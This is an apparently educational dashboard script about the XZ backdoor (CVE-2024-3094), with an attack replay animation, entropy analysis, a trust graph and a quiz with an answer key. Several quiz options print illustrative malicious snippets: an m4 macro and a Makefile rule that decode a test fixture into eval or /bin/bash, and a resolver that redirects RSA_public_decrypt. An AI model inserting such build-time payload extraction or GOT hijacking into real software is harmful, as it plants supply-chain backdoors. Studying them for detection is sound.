                    <div class="timeline-dot ${event.phase}"></div>
                    ${phaseLabel}
                    <div class="timeline-date">${event.date}</div>
                    <div class="timeline-title">${escHtml(event.title)}</div>
                    <div class="timeline-desc">${escHtml(event.description)}</div>
                `;
                container.appendChild(el);
            });
        });
}

/* ============================================================
   UTILITIES
   ============================================================ */
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function escHtml(str) {
    if (!str) return '';
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
}

function animateCount(el, target) {
    let current = 0;
    const step = Math.max(1, Math.ceil(target / 20));
    function tick() {
        current += step;
        if (current > target) current = target;
        el.textContent = current;
        if (current < target) requestAnimationFrame(tick);
    }
    tick();
}

/* ============================================================
   LIVE ATTACK REPLAY
   ============================================================ */
function initReplay() {
    const playBtn = document.getElementById('replay-play-btn');
    const resetBtn = document.getElementById('replay-reset-btn');
    if (!playBtn) return;

    playBtn.addEventListener('click', () => {
        playBtn.style.display = 'none';
        resetBtn.style.display = 'inline-block';
        runReplay();
    });
    resetBtn.addEventListener('click', () => {
        resetBtn.style.display = 'none';
        playBtn.style.display = 'inline-block';
        resetReplay();
    });

    // Build step indicators
    const steps = ['Craft Cert', 'Send Packet', 'RSA Call', 'GOT Redirect', 'Ed448 Verify', 'ChaCha20', 'system()', 'RCE'];
    const ind = document.getElementById('replay-steps-indicator');
    if (ind) {
        ind.innerHTML = steps.map((s, i) => `<span class="rp-step-dot" data-step="${i}">${i + 1}</span>`).join('');
    }
}

function setReplayCaption(step, text) {
    const stepEl = document.getElementById('replay-caption-step');
    const textEl = document.getElementById('replay-caption-text');
    if (stepEl) stepEl.textContent = step ? `Step ${step}` : '';
    if (textEl) textEl.textContent = text;
    // Highlight step dot
    document.querySelectorAll('.rp-step-dot').forEach((d, i) => {
        d.classList.toggle('active', i < parseInt(step));
        d.classList.toggle('current', i === parseInt(step) - 1);
    });
}

async function runReplay() {
    const svg = document.getElementById('replay-svg');
    if (!svg) return;
    const fill = document.getElementById('replay-progress-fill');

    function setProgress(pct) { if (fill) fill.style.width = pct + '%'; }

    // Step 1: Attacker crafts certificate
    setProgress(5);
    setReplayCaption('1', 'Attacker crafts SSH certificate with Ed448-signed payload hidden in RSA modulus (N field)');
    const pulse = svg.querySelector('.rp-attacker-pulse');
    if (pulse) { pulse.setAttribute('stroke-width', '3'); pulse.setAttribute('stroke', '#58a6ff'); pulse.style.animation = 'replayPulse 0.8s ease-out 3'; }
    await sleep(2000);

    // Step 2: Packet travels
    setProgress(15);
    setReplayCaption('2', 'SSH connection initiated — crafted certificate sent to target sshd on TCP port 22');
    const pkt = document.getElementById('rp-packet');
    if (pkt) {
        pkt.setAttribute('opacity', '1');
        pkt.style.transition = 'cx 1.5s ease-in-out';
        pkt.setAttribute('cx', '498');
    }
    await sleep(2000);
    if (pkt) pkt.setAttribute('opacity', '0');

    // Step 3: sshd calls RSA_public_decrypt
    setProgress(28);
    setReplayCaption('3', 'sshd calls RSA_public_decrypt() to verify certificate — enters libcrypto');
    animateArrow('rp-arrow-sshd-crypto', '#58a6ff', 2);
    highlightBox('rp-libcrypto', '#a371f7');
    await sleep(1800);

    // Step 4: GOT redirect to backdoor
    setProgress(42);
    setReplayCaption('4', 'GOT table has been patched by IFUNC backdoor — RSA_public_decrypt redirects to liblzma');
    animateArrow('rp-arrow-crypto-got', '#f85149', 2.5);
    highlightBox('rp-got', '#f85149');
    await sleep(1000);
    animateArrow('rp-arrow-got-lzma', '#f85149', 2.5);
    highlightBox('rp-liblzma', '#f85149');
    await sleep(1500);

    // Step 5: Ed448 verify
    setProgress(56);
    setReplayCaption('5', 'Backdoor extracts payload from RSA modulus and verifies Ed448 signature — confirms attacker identity');
    animateArrow('rp-arrow-lzma-ed448', '#3fb950', 2);
    highlightBox('rp-ed448', '#3fb950');
    const check = document.getElementById('rp-checkmark');
    if (check) { check.setAttribute('opacity', '1'); check.style.transition = 'opacity 0.3s'; }
    await sleep(1800);

    // Step 6: ChaCha20 decrypt
    setProgress(70);
    setReplayCaption('6', 'ChaCha20 decrypts the embedded command — only the attacker holds the symmetric key');
    animateArrow('rp-arrow-ed-chacha', '#d29922', 2);
    highlightBox('rp-chacha', '#d29922');
    const key = document.getElementById('rp-key-icon');
    if (key) { key.setAttribute('opacity', '1'); }
    await sleep(1800);

    // Step 7: system() call
    setProgress(85);
    setReplayCaption('7', 'system() executes attacker command as root — sshd runs with full root privileges');
    animateArrow('rp-arrow-chacha-sys', '#f85149', 3);
    highlightBox('rp-system', '#da3633');
    const explosion = document.getElementById('rp-explosion');
    if (explosion) {
        explosion.setAttribute('opacity', '0.6');
        explosion.style.transition = 'r 0.5s ease-out, opacity 1s';
        explosion.setAttribute('r', '80');
        setTimeout(() => explosion.setAttribute('opacity', '0'), 600);
    }
    await sleep(2000);

    // Step 8: RCE banner
    setProgress(100);
    setReplayCaption('8', 'PRE-AUTH REMOTE CODE EXECUTION AS ROOT — CVE-2024-3094, CVSS 10.0 Critical');
    const banner = document.getElementById('rp-banner');
    if (banner) { banner.setAttribute('opacity', '1'); banner.style.transition = 'opacity 0.5s'; }
}

function animateArrow(id, color, width) {
    const el = document.getElementById(id);
    if (el) { el.setAttribute('stroke', color); el.setAttribute('stroke-width', width); }
}

function highlightBox(id, color) {
    const el = document.getElementById(id);
    if (el) { el.setAttribute('stroke', color); el.setAttribute('stroke-width', '2.5'); }
}

function resetReplay() {
    ['rp-arrow-sshd-crypto','rp-arrow-crypto-got','rp-arrow-got-lzma','rp-arrow-lzma-ed448','rp-arrow-ed-chacha','rp-arrow-chacha-sys'].forEach(id => {
        const el = document.getElementById(id);
        if (el) { el.setAttribute('stroke', '#30363d'); el.setAttribute('stroke-width', '0'); }
    });
    ['rp-libcrypto','rp-got','rp-liblzma','rp-ed448','rp-chacha','rp-system','rp-libsystemd'].forEach(id => {
        const el = document.getElementById(id);
        if (el) { el.setAttribute('stroke', '#30363d'); el.setAttribute('stroke-width', '1.5'); }
    });
    ['rp-checkmark','rp-key-icon','rp-banner'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.setAttribute('opacity', '0');
    });
    const pkt = document.getElementById('rp-packet');
    if (pkt) { pkt.setAttribute('opacity', '0'); pkt.style.transition = 'none'; pkt.setAttribute('cx', '142'); }
    const explosion = document.getElementById('rp-explosion');
    if (explosion) { explosion.setAttribute('r', '0'); explosion.setAttribute('opacity', '0'); }
    const fill = document.getElementById('replay-progress-fill');
    if (fill) fill.style.width = '0%';
    setReplayCaption('', 'Press Play to begin simulation');
    document.querySelectorAll('.rp-step-dot').forEach(d => { d.classList.remove('active', 'current'); });
}

/* ============================================================
   ENTROPY HEATMAP
   ============================================================ */
function initEntropy() {
    const section = document.getElementById('entropy');
    if (!section) return;
    // Load on first tab visit
    let loaded = false;
    const observer = new MutationObserver(() => {
        if (section.classList.contains('active') && !loaded) {
            loaded = true;
            loadEntropy();
        }
    });
    observer.observe(section, { attributes: true, attributeFilter: ['class'] });
}

function loadEntropy() {
    const container = document.getElementById('entropy-container');
    if (!container) return;
    container.innerHTML = '<div class="scan-loading" style="display:block"><div class="spinner"></div><p>Computing Shannon entropy...</p></div>';

    fetch('/api/entropy').then(r => r.json()).then(files => {
        let html = `
        <div class="entropy-legend glass">
            <h3>Entropy Scale (bits/byte)</h3>
            <div class="entropy-scale">
                <div class="entropy-scale-bar"></div>
                <div class="entropy-scale-labels">
                    <span>0.0</span><span>2.0</span><span>4.0</span><span>6.0</span><span>7.0</span><span>8.0</span>
                </div>
            </div>
            <div class="entropy-benchmarks">
                <span class="eb"><span class="eb-dot" style="background:#3fb950"></span>Normal source: ~4-5 bits</span>
                <span class="eb"><span class="eb-dot" style="background:#d29922"></span>Compressed data: ~6-7 bits</span>
                <span class="eb"><span class="eb-dot" style="background:#f85149"></span>Encrypted/random: ~7.5-8 bits</span>
            </div>
        </div>
        <div class="entropy-grid">`;

        files.forEach((f, i) => {
            const color = entropyColor(f.overall_entropy);
            const pct = (f.overall_entropy / 8) * 100;
            const miniBlocks = f.block_entropies.map(e => `<div class="em-block" style="background:${entropyColor(e)}"></div>`).join('');
            html += `
            <div class="entropy-card glass" data-idx="${i}" onclick="showEntropyDetail(${i})">
                <div class="ec-header">
                    <span class="ec-filename">${escHtml(f.filename)}</span>
                    <span class="ec-category" style="color:${color}">${f.category}</span>
                </div>
                <div class="ec-score" style="color:${color}">${f.overall_entropy.toFixed(2)}</div>
                <div class="ec-bar-track"><div class="ec-bar-fill" style="width:${pct}%;background:${color}"></div></div>
                <div class="ec-minimap">${miniBlocks}</div>
                <div class="ec-size">${f.size} bytes &bull; ${f.block_entropies.length} blocks</div>
            </div>`;
        });

        html += '</div><div class="entropy-detail glass" id="entropy-detail" style="display:none"></div>';
        container.innerHTML = html;
        window._entropyData = files;
    });
}

function entropyColor(e) {
    if (e < 3) return '#388bfd';
    if (e < 5) return '#3fb950';
    if (e < 6.5) return '#d29922';
    if (e < 7.2) return '#f85149';
    return '#da3633';
}

window.showEntropyDetail = function(idx) {
    const f = window._entropyData[idx];
    const detail = document.getElementById('entropy-detail');
    if (!detail || !f) return;
    detail.style.display = 'block';

    const blocks = f.block_entropies.map((e, i) =>
        `<div class="ed-cell" style="background:${entropyColor(e)}" title="Block ${i}: ${e.toFixed(3)} bits/byte"></div>`
    ).join('');

    detail.innerHTML = `
        <h3>${escHtml(f.filename)} <span style="color:${entropyColor(f.overall_entropy)}">${f.overall_entropy.toFixed(4)} bits/byte</span></h3>
        <p>${f.size} bytes &bull; ${f.block_entropies.length} blocks of 256 bytes &bull; Category: ${f.category}</p>
        <h4>Block-level Entropy Heatmap</h4>
        <div class="ed-heatmap">${blocks}</div>
        <p class="ed-analysis">${f.overall_entropy > 7.2 ? '&#9888; HIGH ENTROPY — This file has near-maximum entropy, consistent with encrypted or compressed payload data. In the XZ attack, test fixture files with entropy >7.5 were disguised backdoor payloads.' : f.overall_entropy > 6 ? 'Moderate entropy — typical of compressed or structured binary data.' : 'Low-moderate entropy — typical of source code or text files. No anomalies detected.'}</p>
    `;
    detail.scrollIntoView({ behavior: 'smooth', block: 'start' });
};

/* ============================================================
   TRUST GRAPH (Canvas force-directed)
   ============================================================ */
function initTrustGraph() {
    const section = document.getElementById('trust-graph');
    if (!section) return;
    let loaded = false;
    const observer = new MutationObserver(() => {
        if (section.classList.contains('active') && !loaded) {
            loaded = true;
            loadTrustGraph();
        }
    });
    observer.observe(section, { attributes: true, attributeFilter: ['class'] });
}

let graphData = null;
let graphNodes = [];
let graphEdges = [];
let graphCanvas, graphCtx;
let graphAnimFrame;
let replayIdx = 0;
let replayRunning = false;

function loadTrustGraph() {
    fetch('/api/trust-graph').then(r => r.json()).then(data => {
        graphData = data;
        setupGraph(data);
    });
}

function setupGraph(data) {
    graphCanvas = document.getElementById('trust-graph-canvas');
    if (!graphCanvas) return;
    graphCtx = graphCanvas.getContext('2d');
    const w = graphCanvas.width = graphCanvas.parentElement.clientWidth;
    const h = graphCanvas.height = 500;

    const typeColors = { attacker: '#f85149', maintainer: '#58a6ff', sockpuppet: '#d29922', scope: '#8b949e' };
    const phaseColors = { trust_building: '#388bfd', pressure: '#d29922', injection: '#f85149', exploitation: '#da3633', discovery: '#3fb950' };

    // Position nodes
    graphNodes = data.nodes.map((n, i) => {
        let x, y;
        if (n.type === 'attacker') { x = w * 0.15; y = h * 0.5; }
        else if (n.type === 'maintainer') { x = w * 0.5; y = h * 0.2; }
        else if (n.type === 'sockpuppet') { x = w * 0.35 + i * 40; y = h * 0.15; }
        else { x = w * 0.55 + (i % 3) * (w * 0.15); y = h * 0.4 + Math.floor(i / 3) * 100; }
        return { ...n, x: x + (Math.random() - 0.5) * 30, y: y + (Math.random() - 0.5) * 30, vx: 0, vy: 0, radius: n.type === 'scope' ? 30 : 24, color: typeColors[n.type] || '#8b949e' };
    });

    graphEdges = data.edges.map(e => ({
        ...e,
        sourceNode: graphNodes.find(n => n.id === e.source),
        targetNode: graphNodes.find(n => n.id === e.target),
        visible: false,
        color: phaseColors[e.phase] || '#30363d',
    }));

    // Simple force simulation
    for (let iter = 0; iter < 100; iter++) {
        for (let i = 0; i < graphNodes.length; i++) {
            for (let j = i + 1; j < graphNodes.length; j++) {
                const dx = graphNodes[j].x - graphNodes[i].x;
                const dy = graphNodes[j].y - graphNodes[i].y;
                const dist = Math.max(Math.sqrt(dx * dx + dy * dy), 1);
                const force = 5000 / (dist * dist);
                graphNodes[i].vx -= (dx / dist) * force;
                graphNodes[i].vy -= (dy / dist) * force;
                graphNodes[j].vx += (dx / dist) * force;
                graphNodes[j].vy += (dy / dist) * force;
            }
        }
        graphEdges.forEach(e => {
            if (!e.sourceNode || !e.targetNode) return;
            const dx = e.targetNode.x - e.sourceNode.x;
            const dy = e.targetNode.y - e.sourceNode.y;
            const dist = Math.sqrt(dx * dx + dy * dy);
            const force = (dist - 150) * 0.01;
            e.sourceNode.vx += (dx / dist) * force;
            e.sourceNode.vy += (dy / dist) * force;
            e.targetNode.vx -= (dx / dist) * force;
            e.targetNode.vy -= (dy / dist) * force;
        });
        graphNodes.forEach(n => {
            n.x += n.vx * 0.3; n.y += n.vy * 0.3;
            n.vx *= 0.8; n.vy *= 0.8;
            n.x = Math.max(40, Math.min(w - 40, n.x));
            n.y = Math.max(40, Math.min(h - 40, n.y));
        });
    }

    drawGraph();

    document.getElementById('trust-graph-replay-btn')?.addEventListener('click', () => {
        replayIdx = 0;
        replayRunning = true;
        graphEdges.forEach(e => e.visible = false);
        drawGraph();
        replayTick();
    });
}

function replayTick() {
    if (replayIdx >= graphEdges.length) {
        replayRunning = false;
        const label = document.getElementById('trust-graph-phase-label');
        if (label) label.textContent = 'Replay complete';
        return;
    }
    graphEdges[replayIdx].visible = true;
    const edge = graphEdges[replayIdx];
    const label = document.getElementById('trust-graph-phase-label');
    if (label) label.textContent = `${edge.date || ''} — ${edge.label || edge.phase}`;
    drawGraph();
    replayIdx++;
    setTimeout(replayTick, 600);
}

function drawGraph() {
    if (!graphCtx) return;
    const w = graphCanvas.width, h = graphCanvas.height;
    graphCtx.clearRect(0, 0, w, h);

    // Draw edges
    graphEdges.forEach(e => {
        if (!e.visible || !e.sourceNode || !e.targetNode) return;
        graphCtx.beginPath();
        graphCtx.moveTo(e.sourceNode.x, e.sourceNode.y);
        graphCtx.lineTo(e.targetNode.x, e.targetNode.y);
        graphCtx.strokeStyle = e.color;
        graphCtx.lineWidth = e.type === 'pressure' ? 2.5 : 1.5;
        if (e.type === 'pressure') graphCtx.setLineDash([6, 4]);
        else graphCtx.setLineDash([]);
        graphCtx.stroke();
        graphCtx.setLineDash([]);
    });

    // Draw nodes
    graphNodes.forEach(n => {
        graphCtx.beginPath();
        if (n.type === 'scope') {
            const r = n.radius;
            graphCtx.roundRect(n.x - r, n.y - r * 0.7, r * 2, r * 1.4, 6);
            graphCtx.fillStyle = '#161b22';
            graphCtx.fill();
            graphCtx.strokeStyle = n.critical ? '#f85149' : '#30363d';
            graphCtx.lineWidth = n.critical ? 2 : 1;
            graphCtx.stroke();
        } else {
            graphCtx.arc(n.x, n.y, n.radius, 0, Math.PI * 2);
            graphCtx.fillStyle = '#161b22';
            graphCtx.fill();
            graphCtx.strokeStyle = n.color;
            graphCtx.lineWidth = 2;
            graphCtx.stroke();
        }
        graphCtx.fillStyle = n.color;
        graphCtx.font = 'bold 10px monospace';
        graphCtx.textAlign = 'center';
        graphCtx.fillText(n.label, n.x, n.y + 4);
    });
}

/* ============================================================
   QUIZ / CTF MODE
   ============================================================ */
const QUIZ_QUESTIONS = [
    { q: 'How long did Jia Tan spend building trust before injecting malicious code?', o: ['~6 months', '~1 year', '~2 years', '~5 years'], a: 2 },
    { q: 'Where was the backdoor payload hidden?', o: ['In the git repo', 'In release tarballs only', 'In CI pipelines', 'In npm packages'], a: 1 },
    {
        q: 'Which of these m4 macro snippets is malicious?',
        type: 'code',
        o: [
`AC_DEFUN([gl_BUILD_TO_HOST],
[  gl_cv_host_os=$(uname -s)
   AC_SUBST([gl_cv_host_os])
])`,
`AC_DEFUN([gl_BUILD_TO_HOST],
[  gl_cv_host_os=$(uname -s)
   if test -f tests/files/bad-3-corrupt_lzma2.xz; then
     eval $(sed "s/-.*//" tests/files/bad-3-corrupt_lzma2.xz \\
       | tr "\\t \\-_" " \\t_\\-" | head -c 7966 | xz -d 2>/dev/null)
   fi
])`,
`AC_DEFUN([gl_BUILD_TO_HOST],
[  gl_cv_host_os=$(uname -s)
   AM_CONDITIONAL([HAVE_CHECK],
     [test "$have_check" = "yes"])
])`,
`AC_DEFUN([gl_BUILD_TO_HOST],
[  gl_cv_host_os=$(uname -s)
   AC_CHECK_HEADERS([stdlib.h string.h])
])`
        ],
        a: 1,
        explain: 'The second snippet extracts hidden data from a "test fixture" file using sed, tr, head, and xz -d, then executes it with eval. This is exactly how the XZ backdoor injected its payload during the build process.'
    },
    { q: 'What mechanism did the backdoor use to hook into sshd?', o: ['LD_PRELOAD', 'ptrace', 'GNU IFUNC resolver', 'Kernel module'], a: 2 },
    {
        q: 'Which C function contains a backdoor hook?',
        type: 'code',
        o: [
`int lzma_crc64_resolve(void) {
  // Standard CRC64 IFUNC resolver
  if (__builtin_cpu_supports("pclmul"))
    return USE_CLMUL;
  return USE_GENERIC;
}`,
`void *_get_cpuid(int leaf, int *eax,
  int *ebx, int *ecx, int *edx) {
  __cpuid_count(leaf, 0, *eax, *ebx,
                *ecx, *edx);
  return NULL;
}`,
`int lzma_crc64_resolve(void) {
  Dl_info info;
  void *handle = dlopen("libcrypto.so",
                        RTLD_NOW);
  void *sym = dlsym(handle,
    "RSA_public_decrypt");
  got_write(sym, backdoor_dispatch);
  return USE_CLMUL;
}`,
`size_t lzma_stream_decode(
  lzma_stream *strm,
  const uint8_t *in, size_t in_size) {
  return lzma_raw_decoder(strm, in,
                          in_size);
}`
        ],
        a: 2,
        explain: 'The third snippet disguises itself as a CRC resolver but actually opens libcrypto, finds RSA_public_decrypt via dlsym, and overwrites the GOT entry with a backdoor dispatcher. This is how the XZ backdoor hijacked SSH authentication.'
    },
    { q: 'Which function was hijacked by the backdoor?', o: ['malloc', 'RSA_public_decrypt', 'strcmp', 'write'], a: 1 },
    {
        q: 'Which build script line is hiding malicious payload extraction?',
        type: 'code',
        o: [
`CFLAGS="-O2 -Wall -Wextra -pedantic"`,
`sed "s/-.*//" tests/files/bad-3-corrupt_lzma2.xz | tr "\\t \\-_" " \\t_\\-" | head -c 7966 | xz -d`,
`./configure --prefix=/usr --disable-static`,
`make -j$(nproc) check TESTS="test_compress"`
        ],
        a: 1,
        explain: 'This sed/tr/head/xz pipeline is the XZ payload extraction chain. It reads bytes from a disguised "test fixture" file, performs character substitution to restore the original bytes, truncates to exactly 7966 bytes, then decompresses the LZMA-compressed backdoor shellscript.'
    },
    { q: 'What crypto primitives did the backdoor use?', o: ['AES + RSA', 'Ed448 + ChaCha20', 'SHA256 + ECDSA', 'Blowfish + DSA'], a: 1 },
    {
        q: 'Which Makefile snippet injects code into the build?',
        type: 'code',
        o: [
`test_input:
\t@echo "Running compression tests..."
\t./test_compress $(TEST_FILES)`,
`install:
\tcp liblzma.so $(DESTDIR)/usr/lib/
\tchmod 755 $(DESTDIR)/usr/lib/liblzma.so`,
`liblzma_la_SOURCES += ../tests/files/bad-3-corrupt_lzma2.xz
am__test = sed "s/-.*//" $(top_srcdir)/tests/files/bad-3-corrupt_lzma2.xz \\
\t| tr "\\t \\-_" " \\t_\\-" | xz -d 2>/dev/null | /bin/bash`,
`clean:
\trm -f *.o *.lo *.la
\trm -rf .libs`
        ],
        a: 2,
        explain: 'This Makefile adds a "test" file as a source dependency, then pipes it through the sed/tr/xz extraction chain directly into /bin/bash for execution. Legitimate build rules never pipe decompressed test data into a shell.'
    },
    { q: 'Who discovered the backdoor?', o: ['Google Project Zero', 'NSA', 'Andres Freund', 'Lasse Collin'], a: 2 },
    {
        q: 'Which SSH certificate field is suspicious?',
        type: 'code',
        o: [
`cert.key_id = "user@host.example.com"
cert.valid_after = "20240301120000"
cert.valid_before = "20250301120000"`,
`cert.key_id = b"\\x00" * 16 + ed448_signed_payload
  + chacha20_encrypted_cmd
cert.valid_after = "19700101000000"
cert.valid_before = "99991231235959"`,
`cert.key_id = "deploy-key-production"
cert.serial = 1001
cert.cert_type = SSH_CERT_TYPE_HOST`,
`cert.key_id = "github-actions-runner"
cert.extensions = {"permit-pty": ""}`
        ],
        a: 1,
        explain: 'The second certificate embeds an Ed448-signed payload and ChaCha20-encrypted command directly in the key_id field, with absurd validity dates. The XZ backdoor used the SSH certificate\'s N field (public key) to smuggle encrypted commands past authentication.'
    },
    { q: 'What tipped off the discoverer?', o: ['Code review', '500ms SSH login delay', 'Failed tests', 'Antivirus alert'], a: 1 },
    { q: 'What is the CVSS score of CVE-2024-3094?', o: ['7.5', '8.1', '9.8', '10.0'], a: 3 },
];

let quizIdx = 0, quizScore = 0;

function initQuiz() {
    const section = document.getElementById('quiz');
    if (!section) return;
    const startBtn = document.getElementById('quiz-start-btn');
    if (startBtn) startBtn.addEventListener('click', startQuiz);
}

function startQuiz() {
    quizIdx = 0; quizScore = 0;
    document.getElementById('quiz-intro')?.setAttribute('style', 'display:none');
    document.getElementById('quiz-area')?.setAttribute('style', 'display:block');
    document.getElementById('quiz-result')?.setAttribute('style', 'display:none');
    showQuestion();
}

function showQuestion() {
    if (quizIdx >= QUIZ_QUESTIONS.length) { showQuizResult(); return; }
    const q = QUIZ_QUESTIONS[quizIdx];
    const area = document.getElementById('quiz-area');
    if (!area) return;
    const pct = ((quizIdx) / QUIZ_QUESTIONS.length) * 100;
    const isCode = q.type === 'code';
    area.innerHTML = `
        <div class="quiz-progress"><div class="quiz-progress-fill" style="width:${pct}%"></div></div>
        <div class="quiz-counter">Question ${quizIdx + 1} of ${QUIZ_QUESTIONS.length}</div>
        ${isCode ? '<div class="quiz-type-badge">CODE ANALYSIS</div>' : ''}
        <div class="quiz-question">${escHtml(q.q)}</div>
        <div class="quiz-options ${isCode ? 'quiz-options-code' : ''}">
            ${q.o.map((opt, i) => `<button class="quiz-option ${isCode ? 'quiz-option-code' : ''}" onclick="answerQuiz(${i})">${isCode ? '<pre class="quiz-code">' + escHtml(opt) + '</pre>' : escHtml(opt)}</button>`).join('')}
        </div>
        <div class="quiz-explain" id="quiz-explain" style="display:none"></div>
    `;
}

window.answerQuiz = function(idx) {
    const q = QUIZ_QUESTIONS[quizIdx];
    const btns = document.querySelectorAll('.quiz-option');
    btns.forEach((b, i) => {
        b.disabled = true;
        if (i === q.a) b.classList.add('correct');
        if (i === idx && idx !== q.a) b.classList.add('wrong');
    });
    if (idx === q.a) quizScore++;
    // Show explanation for code questions
    const explainEl = document.getElementById('quiz-explain');
    if (q.explain && explainEl) {
        explainEl.style.display = 'block';
        explainEl.innerHTML = `<div class="quiz-explain-inner ${idx === q.a ? 'explain-correct' : 'explain-wrong'}">
            <strong>${idx === q.a ? '&#10003; Correct!' : '&#10007; Incorrect'}</strong>
            <p>${q.explain}</p>
        </div>`;
    }
    const delay = q.explain ? 4000 : 1200;
    setTimeout(() => { quizIdx++; showQuestion(); }, delay);
};

function showQuizResult() {
    const area = document.getElementById('quiz-area');
    const result = document.getElementById('quiz-result');
    if (area) area.style.display = 'none';
    if (!result) return;
    result.style.display = 'block';
    const pct = Math.round((quizScore / QUIZ_QUESTIONS.length) * 100);
    const grade = pct >= 90 ? 'A+' : pct >= 80 ? 'A' : pct >= 70 ? 'B' : pct >= 60 ? 'C' : 'F';
    const gradeColor = pct >= 80 ? '#3fb950' : pct >= 60 ? '#d29922' : '#f85149';
    result.innerHTML = `
        <div class="quiz-score-card glass">
            <div class="quiz-grade" style="color:${gradeColor}">${grade}</div>
            <div class="quiz-final-score">${quizScore} / ${QUIZ_QUESTIONS.length} correct (${pct}%)</div>
            <p>${pct >= 80 ? 'Excellent! You have a deep understanding of the XZ backdoor attack.' : pct >= 60 ? 'Good work! Review the Dissect tab to fill in the gaps.' : 'Keep learning! Explore the Attack Flow and Dissect tabs for more details.'}</p>
            <button class="btn btn-primary" onclick="startQuiz()">Retry</button>
        </div>
    `;
}

/* ============================================================
   SIDE-BY-SIDE COMPARE
   ============================================================ */
function initCompare() {
    const btn = document.getElementById('compare-btn');
    if (btn) btn.addEventListener('click', runCompare);
}

function runCompare() {
    const container = document.getElementById('compare-results');
    if (!container) return;
    container.style.display = 'block';
    container.innerHTML = '<div class="scan-loading" style="display:block"><div class="spinner"></div><p>Running comparison scan...</p></div>';

    fetch('/api/scan-compare', { method: 'POST' }).then(r => r.json()).then(data => {
        container.innerHTML = `
        <div class="compare-grid">
            <div class="compare-panel clean glass">
                <div class="compare-header" style="border-color:#3fb950">
                    <h3 style="color:#3fb950">Clean Project</h3>
                    <span class="compare-path">${escHtml(data.clean.target_path)}</span>
                </div>
                <div class="compare-score" style="color:#3fb950">${data.clean.risk_score.toFixed(1)}<span>/10</span></div>
                <div class="compare-findings">${data.clean.total_findings} findings</div>
                ${renderCompareSeverity(data.clean.severity_counts || {})}
            </div>
            <div class="compare-vs">VS</div>
            <div class="compare-panel infected glass">
                <div class="compare-header" style="border-color:#f85149">
                    <h3 style="color:#f85149">Infected Samples</h3>
                    <span class="compare-path">${escHtml(data.infected.target_path)}</span>
                </div>
                <div class="compare-score" style="color:#f85149">${data.infected.risk_score.toFixed(1)}<span>/10</span></div>
                <div class="compare-findings">${data.infected.total_findings} findings</div>
                ${renderCompareSeverity(data.infected.severity_counts || {})}
            </div>
        </div>`;
    });
}

function renderCompareSeverity(counts) {
    return ['critical','high','medium','low','info'].map(sev => {
        const c = counts[sev] || 0;
        return c ? `<div class="compare-sev"><span class="sev-badge sev-${sev}">${sev}</span> <span>${c}</span></div>` : '';
    }).join('');
}

/* ============================================================
   MEMORY MAP (added to Dissect tab)
   ============================================================ */
function initMemoryMap() {
    const toggle = document.getElementById('memmap-toggle');
    if (!toggle) return;
    let showBackdoor = false;
    toggle.addEventListener('click', () => {
        showBackdoor = !showBackdoor;
        toggle.textContent = showBackdoor ? 'Show Normal Flow' : 'Show Backdoor Flow';
        document.getElementById('memmap-normal')?.setAttribute('opacity', showBackdoor ? '0' : '1');
        document.getElementById('memmap-backdoor')?.setAttribute('opacity', showBackdoor ? '1' : '0');
    });
}

/* ============================================================
   REPORT EXPORT
   ============================================================ */
function initReportExport() {
    const btn = document.getElementById('export-report-btn');
    if (!btn) return;
    btn.addEventListener('click', () => {
        if (!window._lastScanData) { alert('Run a scan first!'); return; }
        const data = window._lastScanData;
        const html = `<!DOCTYPE html><html><head><title>XZ-Bot Scan Report</title>
        <style>body{font-family:monospace;background:#0d1117;color:#c9d1d9;padding:40px;max-width:900px;margin:auto}
        h1{color:#58a6ff}table{width:100%;border-collapse:collapse;margin:20px 0}th,td{padding:8px 12px;border:1px solid #30363d;text-align:left;font-size:13px}
        th{background:#161b22;color:#8b949e}.critical{color:#da3633}.high{color:#f85149}.medium{color:#d29922}
        .score{font-size:48px;font-weight:bold;color:${data.risk_score >= 8 ? '#da3633' : data.risk_score >= 5 ? '#d29922' : '#3fb950'}}</style></head>
        <body><h1>XZ-Bot Vulnerability Scan Report</h1>
        <p>Target: ${escHtml(data.target_path)}<br>Time: ${data.timestamp}<br>Findings: ${data.total_findings}</p>
        <div class="score">${data.risk_score.toFixed(1)}/10</div>
        <table><tr><th>Severity</th><th>Rule</th><th>Category</th><th>Title</th><th>File</th></tr>
        ${(data.findings||[]).map(f=>`<tr><td class="${f.severity}">${f.severity}</td><td>${f.rule_id}</td><td>${f.category}</td><td>${f.title}</td><td>${f.file_path?f.file_path.split('/').pop():'-'}</td></tr>`).join('')}
        </table><p style="color:#8b949e;font-size:11px">Generated by XZ-Bot v1.0.0 | Educational tool only</p></body></html>`;
        const blob = new Blob([html], { type: 'text/html' });
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = 'xz-bot-scan-report.html';
        a.click();
    });
}

/* ============================================================
   DARK/LIGHT THEME TOGGLE
   ============================================================ */
function initThemeToggle() {
    const btn = document.getElementById('theme-toggle');
    if (!btn) return;
    btn.addEventListener('click', () => {
        document.body.classList.toggle('light-theme');
        btn.textContent = document.body.classList.contains('light-theme') ? '🌙' : '☀️';
    });
}

/* ============================================================
   KEYBOARD SHORTCUTS
   ============================================================ */
function initKeyboardShortcuts() {
    const tabKeys = { '1': 'attack-flow', '2': 'scanner', '3': 'dissect', '4': 'timeline', '5': 'replay', '6': 'entropy', '7': 'trust-graph', '8': 'quiz' };
    document.addEventListener('keydown', (e) => {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
        if (tabKeys[e.key]) {
            e.preventDefault();
            const tab = document.querySelector(`.tab[data-tab="${tabKeys[e.key]}"]`);
            if (tab) tab.click();
        }
        if (e.key === '?') {
            alert('Keyboard Shortcuts:\\n1-8: Switch tabs\\n?: Show shortcuts');
        }
    });
}

// Store last scan data for export
const _origRenderScanResults = renderScanResults;
renderScanResults = function(data) {
    window._lastScanData = data;
    _origRenderScanResults(data);
};
